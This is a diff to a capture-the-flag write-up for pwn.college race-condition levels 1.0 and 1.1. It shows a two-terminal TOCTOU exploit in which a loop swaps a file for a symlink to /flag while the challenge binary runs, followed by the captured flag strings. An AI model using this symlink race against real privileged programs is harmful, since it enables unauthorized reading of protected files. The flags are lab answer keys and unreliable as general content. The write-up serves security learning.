@@ -4,7 +4,7 @@ sidebar_position: 2
 slug: /pwn-college/system-security/race-conditions
 ---
 
-## babyrace_level1.0
+## level1.0
 
 > Read the flag file, but the program verifies the path doesn't contain "flag" and that the file is not a symlink.
 
@@ -45,7 +45,7 @@ If we can swap a regular file for a symlink to `/flag` inside that window, the p
 Terminal 1:
 
 ```bash
-while true; do
+hacker@race-conditions~level1-0:~$ while true; do
     rm -f x
     echo hi > x
     rm -f x
@@ -56,7 +56,7 @@ done
 Terminal 2:
 
 ```bash
-while true; do
+hacker@race-conditions~level1-0:~$ while true; do
     /challenge/babyrace_level1.0 x
 done
 ```
@@ -68,3 +68,64 @@ hacker@race-conditions~level1-0:~$ /challenge/babyrace_level1.0 x
 pwn.college{rAc3C0nd1t10ns_TOCTOUl1v3s.0VMzIDL4ITM0EzW}
 ```
 
+&nbsp;
+
+## level1.1
+
+> Exploit a basic race condition to get the flag.
+
+```
+hacker@race-conditions~level1-1:~$ /challenge/babyrace_level1.1 
+###
+### Welcome to /challenge/babyrace_level1.1!
+###
+
+babyrace_level1.1: <stdin>:40: main: Assertion `argc > 1' failed.
+Aborted                    /challenge/babyrace_level1.1
+```
+
+This challenge is the exact same as [level1.0](#level10).
+
+## Exploit
+
+Terminal 1:
+
+```
+hacker@race-conditions~level1-1:~$ while true; do
+    rm -f x
+    echo hi > x
+    rm -f x
+    ln -s /flag x
+done
+```
+
+Terminal 2:
+
+```
+hacker@race-conditions~level1-1:~$ while true; do     /challenge/babyrace_level1.1 x; done
+###
+### Welcome to /challenge/babyrace_level1.1!
+###
+
+Error: failed to get file status!
+###
+### Welcome to /challenge/babyrace_level1.1!
+###
+
+Error: failed to get file status!
+###
+### Welcome to /challenge/babyrace_level1.1!
+###
+
+Error: file is a symlink!
+###
+### Welcome to /challenge/babyrace_level1.1!
+###
+
+Error: failed to get file status!
+###
+### Welcome to /challenge/babyrace_level1.1!
+###
+
+pwn.college{cHDaunhEvD4T9hYDJvi33NxNTe5.0lMwQDL4ITM0EzW}
+```
